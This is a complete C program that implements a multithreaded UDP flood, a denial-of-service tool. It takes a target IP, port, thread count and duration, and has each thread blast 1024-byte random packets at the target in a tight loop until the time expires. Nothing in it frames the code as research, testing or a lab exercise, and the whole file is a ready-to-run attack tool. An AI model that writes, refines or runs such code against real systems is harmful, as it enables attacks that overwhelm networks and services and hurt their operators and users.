#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <time.h>

#define PACKET_SIZE 1024

typedef struct {
    struct sockaddr_in server;
    time_t end_time;
} ThreadArgs;

void* udp_flood(void* arg) {
    ThreadArgs args = *(ThreadArgs*)arg;
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) {
        perror("Socket creation failed");
        return NULL;
    }

    char payload[PACKET_SIZE];
    for (int i = 0; i < PACKET_SIZE; i++) {
        payload[i] = rand() % 256;  // Randomized payload
    }

    while (time(NULL) < args.end_time) {
        sendto(sock, payload, PACKET_SIZE, 0, (struct sockaddr*)&args.server, sizeof(args.server));
    }

    close(sock);
    return NULL;
}

int main(int argc, char* argv[]) {
    if (argc != 5) {
        printf("Usage: %s <IP> <Port> <Threads> <Time (seconds)>\n", argv[0]);
        return 1;
    }

    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(atoi(argv[2]));
    inet_pton(AF_INET, argv[1], &server.sin_addr);

    int threads = atoi(argv[3]);
    int duration = atoi(argv[4]);
    time_t end_time = time(NULL) + duration;

    printf("Starting UDP flood on %s:%d for %d seconds using %d threads.\n", argv[1], atoi(argv[2]), duration, threads);

    pthread_t thread_pool[threads];
    ThreadArgs args = {server, end_time};

    for (int i = 0; i < threads; i++) {
        pthread_create(&thread_pool[i], NULL, udp_flood, &args);
        usleep(10000);  // Small delay to avoid overwhelming system instantly
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(thread_pool[i], NULL);
    }

    printf("UDP flood completed.\n");
    return 0;
}
